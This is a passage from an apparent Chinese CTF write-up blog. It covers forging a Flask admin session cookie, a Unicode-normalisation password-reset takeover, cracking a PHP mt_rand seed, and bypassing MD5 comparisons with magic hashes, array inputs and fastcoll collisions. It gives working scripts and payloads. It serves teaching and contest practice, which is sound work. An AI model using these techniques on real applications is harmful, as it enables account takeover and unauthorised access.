alt="image-185.png"></p><p>可知需要用户为admin才可以拿到flag，下载下来后发现web框架是用<a href="https://baike.baidu.com/item/Flask/1241509?fr=aladdin" target="_blank" rel="noopener">flask</a>写的</p><p>解题具体操作如下：</p><p>先注册一个账户：admin1</p><p>在index界面拿到自己的session，进行解码，上大佬脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/26/HEjTQxWIGPJs68y.png" alt="image-187.png"></p><p>在index.html发现只要session[‘name’]==’admin’即可作为admin用户登录，再将解码出来的session中的name改为admin再进行一次编码来伪造admin的session，对session编码需要SECRET_KEY，在config.py处找到，此处用脚本编码，<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">脚本git下载地址</a></p><p><img src="https://i.loli.net/2020/03/26/57s1tOJ8nkvQG42.png" alt="image-188.png"></p><p><img src="https://i.loli.net/2020/03/26/PUoerHbaDEzfqXp.png" alt="image-186.png"></p><p>将自己的session修改为编码后的session即可得到flag</p><h3 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h3><p>当解题思路断了的时候，不妨结合代码角度思考，前面在改密码界面就感觉到bdui，因为密码就直接改不需要验证什么的，于是找到改密码的change函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/change', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        name = strlower(session[<span class="string">'name'</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">'change successful'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'change.html'</span>, title = <span class="string">'change'</span>, form = form)</span><br></pre></td></tr></table></figure><p>经大佬文章提点，发现在进行改密的时候使用了strlower函数将用户名转成了小写，一般在python中转小写用的都是lower函数，于是跟进strlower函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span>:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>研究nodeprep.prepare函数，nodeprep是从Twisted模块导入的，在requirements.txt文件中看到Twisted版本与最新版本相差甚远，存在猫腻，<a href="https://panda1g1.github.io/2018/11/15/HCTF%20admin/" target="_blank" rel="noopener">参考</a></p><p>于是就有了以下的Unicode编码问题；具体编码方式：<a href="https://unicode-table.com/cn/search/?q=%E4%BF%AE%E9%A5%B0%E5%AD%97%E6%AF%8D%E5%A4%A7%E5%86%99" target="_blank" rel="noopener">修饰字母大写</a></p><p>nodeprep.prepare会进行如下操作</p><p>ᴬ-&gt;A-&gt;a;ᴬdmin-&gt;Admin-&gt;admin</p><p>参考：</p><p><img src="https://i.loli.net/2020/03/26/YfaPUM4nLEjVoKH.png" alt="ba81f7598149fdce96a3ad74e3ab6ff1.png"></p><p>注册 ᴬdmin ；登录 ᴬdmin ，经过一次strlower变成Admin，修改密码时name又经过一次strlower更改了admin的密码，随后即可以修改后的密码登录拿到flag</p><h2 id="安恒杯-新春祈福赛—枯燥的抽奖"><a href="#安恒杯-新春祈福赛—枯燥的抽奖" class="headerlink" title="安恒杯-新春祈福赛—枯燥的抽奖"></a>安恒杯-新春祈福赛—枯燥的抽奖</h2><p>界面：</p><p><img src="https://i.loli.net/2020/03/26/5n4bdA1CK7zgLsX.png" alt="image-20200202200452558.png"></p><p>F12发现check.php，访问得到php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'seed'</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'num'</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure><p>发现mt_srand()和mt_rand() 并且session是用随机数设置的</p><p>上爆破工具php_mt_seed和脚本得到随机数种子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'cTVM5ZeUkl'</span></span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 2 0 61 55 55 0 61 57 57 0 61 48 48 0 61 31 31 0 61 61 61 0 61 4 4 0 61 56 56 0 61 10 10 0 61 11 11 0 61</span><br></pre></td></tr></table></figure><p>爆破</p><p><img src="https://i.loli.net/2020/03/26/nD79agbqeWK8PMp.png" alt="image-20200202201906349.png"></p><p>将得到的随机种子放到php脚本中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">654818272</span>);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到字符串</p><p><img src="https://i.loli.net/2020/03/26/kZmr1vP2TJFjgsq.png" alt="image-20200202202206918.png"></p><h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><h2 id="安恒月赛—web2-hash"><a href="#安恒月赛—web2-hash" class="headerlink" title="安恒月赛—web2_hash"></a>安恒月赛—web2_hash</h2><p>本题参考：</p><blockquote><p><a href="https://www.gem-love.com/ctf/1799.html#web2_hash" target="_blank" rel="noopener">2020二月安恒月赛抗疫练习赛web题目writeup</a><br><a href="https://xz.aliyun.com/t/4741#toc-7" target="_blank" rel="noopener">2019掘安杯web7 writeup</a><br><a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">第二届强网杯 MD5碰撞 writeup</a></p></blockquote><p>进来先看界面代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$val1 = @$_GET[<span class="string">'val1'</span>];</span><br><span class="line">$val2 = @$_GET[<span class="string">'val2'</span>];</span><br><span class="line">$val3 = @$_GET[<span class="string">'val3'</span>];</span><br><span class="line">$val4 = @$_GET[<span class="string">'val4'</span>];</span><br><span class="line">$val5 = (string)@$_POST[<span class="string">'val5'</span>];</span><br><span class="line">$val6 = (string)@$_POST[<span class="string">'val6'</span>];</span><br><span class="line">$val7 = (string)@$_POST[<span class="string">'val7'</span>];</span><br><span class="line"><span class="keyword">if</span>( $val1 == $val2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'val1 OR val2 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($val1) != md5($val2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $val3 == $val4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'val3 OR val4 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($val3) !== md5($val4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $val5 == $val6 || $val5 == $val7 || $val6 == $val7 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'val5 OR val6 OR val7 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (md5($val5) !== md5($val6) || md5($val6) !== md5($val7) || md5($val5) !== md5($val7))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> !($_POST[<span class="string">'b'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"come on!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$a = $_POST[<span class="string">'a'</span>];</span><br><span class="line">$b = $_POST[<span class="string">'b'</span>];</span><br><span class="line">$m = $_GET[<span class="string">'m'</span>];</span><br><span class="line">$n = $_GET[<span class="string">'n'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctype_alnum($a)) || (strlen($a) &gt; <span class="number">5</span>)  || !(ctype_alnum($b)) || (strlen($b) &gt; <span class="number">6</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"a OR b fail!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((strlen($m) &gt; <span class="number">1</span>) || (strlen($n) &gt; <span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"m OR n fail"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$val8 = md5($a);</span><br><span class="line">$val9 = strtr(md5($b), $m, $n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;val8 : $val8&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;val9 : $val9&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">if</span> (($val8 == $val9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === <span class="number">5</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"nice,good job,give you flag:"</span>;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'/var/www/html/flag.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码审计一个一个绕</p><p>第1、2个if：<code>val1</code>不能和<code>val2</code>一样，且<code>val1</code>和<code>val2</code>的MD5值需要相同，由于这里是用<code>!=</code>进行判断的，于是就可以用MD5弱比较进行绕过；这里给出两个可以绕过比较的字符串<code>s878926199a</code>和<code>s155964671a</code>、payload：<code>?val1=s878926199a&amp;val2=s155964671a</code>、随后进入下个if（当然这里也可以用数组绕过，下两个if解释）</p><blockquote><p>注：<code>s878926199a</code>的MD5值为<code>0e545993274517709034328855841020</code>，<code>s155964671a</code>的MD5值为<code>0e342768416822451524974117254469</code>函数在执行<code>!=</code>判断的时候会认为是以<code>0e</code>开头的科学计数法，所以两边都为0，即构成了弱比较绕过</p></blockquote><p>第3、4个if：<code>val3</code>不能和<code>val4</code>一样，且<code>val3</code>和<code>val4</code>的MD5值需要相同，而这里使用的是<code>!==</code>进行判断，这种判断会对MD5加密后的字符串进行严格的逐个字符判断，所以使用上面的方法是无效的，但是这里可以使用数组类型进行绕过，由于MD5函数无法处理数组，所以两边返回的都是<code>NULL</code>（上两个if也适用），就构成了绕过；payload：<code>?val1=s878926199a&amp;val2=s155964671a&amp;val3[]=1&amp;val4[]=2</code></p><p>第5、6个if：这里的函数需要让<code>val5</code>、<code>val6</code>、<code>val7</code>都不相等，且三个值的MD5值需要相同，并且使用的是<code>!==</code>进行判断，且在获取数值的时候进行了<code>string</code>类型转换，如果是数组的话会直接转换不成功，三个值没得到东西，第一个判断都过不了，这里就需要找到三个真正相等的MD5值的原型，这里就需要参考一篇文章：<a href="https://xz.aliyun.com/t/3161#toc-5" target="_blank" rel="noopener">基于全等的MD5碰撞绕过</a>、如文章所述（cmd中执行）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -o 0 1    -o参数代表随机生成两个相同MD5的文件</span><br><span class="line">fastcoll_v1.0.0.5.exe -p 1 -o 00 01    -p参数代表根据1文件随机生成两个相同MD5的文件，注意：生成的MD5与1不同</span><br><span class="line">tail.exe -c 128 00 &gt; a    -c 128代表将00的最后128位写入文件a，这128位正是1与00的MD5不同的原因</span><br><span class="line">tail.exe -c 128 01 &gt; b    同理</span><br><span class="line">type 0 a &gt; 10    这里表示将0和a文件的内容合并写入10</span><br><span class="line">type 0 b &gt; 11    这里表示将0和b文件的内容合并写入11</span><br></pre></td></tr></table></figure><p><a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip" target="_blank" rel="noopener">fastcoll下载链接</a>、<a href="https://www.trisunsoft.com/tail-for-windows.htm" target="_blank" rel="noopener">tail.exe下载链接</a></p><p>这样就生成了4个MD5值相同的文件，查看四个文件的MD5值，是预期结果</p><p><img src="https://i.loli.net/2020/03/26/vsBMkn48lLp1Thr.png" alt="image-20200227120733977.png"></p><p>于是在PHP中生成其中三个的urlencode的值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    $fh = fopen($path, <span class="string">"rb"</span>);</span><br><span class="line">    $data = fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'二进制hash '</span>.md5((readmyfile(<span class="string">"00"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>.urlencode(readmyfile(<span class="string">"00"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5(urlencode (readmyfile(<span class="string">"00"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'二进制hash '</span>.md5((readmyfile(<span class="string">"10"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>.urlencode(readmyfile(<span class="string">"10"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5(urlencode(readmyfile(<span class="string">"10"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'二进制hash '</span>.md5((readmyfile(<span class="string">"11"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>.urlencode(readmyfile(<span class="string">"11"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5( urlencode(readmyfile(<span class="string">"11"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/26/A8mGCDltFzIkujK.png" alt="image-20200227121027756.png"></p><p>复制到burp中发包，可以看到成功绕过了if，进入下面的if</p><p><img src="https://i.loli.net/2020/03/26/YmHzV1kMryAT23w.png" alt="image-20200227121221514.png"></p><p>第7、8、9个if：POST两个值分别为<code>$a</code>和<code>$b</code>，<code>ctype_alnum()</code>表示函数内的值只能是字母个数字的组合，第7个if的意思我们的<code>$a</code>和<code>$b</code>需要满足<code>ctype_alnum()</code>函数，且长度不能大于五，第8个if的意思是get的参数<code>$m</code>和<code>$n</code>长度不能大于1，也就是只能为一个字符</p><p>后面的<code>$val8</code>为<code>$a</code>MD5加密后的值，<code>$val9</code>为<code>$b</code>结果MD5加密后，替换其中的<code>$m</code>值为<code>$n</code>的值</p><p>最后一个if：表示<code>$val8</code>和<code>$val9</code>的值都必须相等，注意这里是使用<code>==</code>进行判断，也就是说会认为<code>0e</code>开头的为科学计数法进行判断，<code>$a</code>和<code>$b</code>的值不能相等，且<code>$b</code>的长度必须为5</p><p>结果分析，有这种绕过方法：假设<code>$a</code>MD5加密后的值为<code>0e123421342...</code>、<code>$b</code>MD5加密后的值为<code>($m)e4657564745...</code>、就可以利用令<code>$n</code>=0来替换<code>$b</code>MD5加密后的第一位<code>$m</code>的值，从而构成绕过，这是我们只需要得到<strong>一个5位的MD5值开头<code>0e</code>后面跟的全是数字的MD5原型</strong>和<strong>一个5位的MD5值的第二位为e后面跟的全是数字的MD5原型</strong>，于是写脚本跑出这两个5位数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line">    str = <span class="string">"qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> str:</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> str:</span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> str:</span><br><span class="line">                        payload = (i+j+m+n+k).encode(<span class="string">"utf-8"</span>)</span><br><span class="line">                        str1 = hashlib.md5(payload)</span><br><span class="line">                        test1 = str1.hexdigest()</span><br><span class="line">                        <span class="keyword">if</span> test1[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">"0e"</span> <span class="keyword">and</span> test1[<span class="number">2</span>:].isdigit():</span><br><span class="line">                            print(<span class="string">"&#123;&#125;-&gt;&#123;&#125;"</span>.format(payload,test1))</span><br><span class="line">                            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">()</span>:</span></span><br><span class="line">    str = <span class="string">"qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">            <span 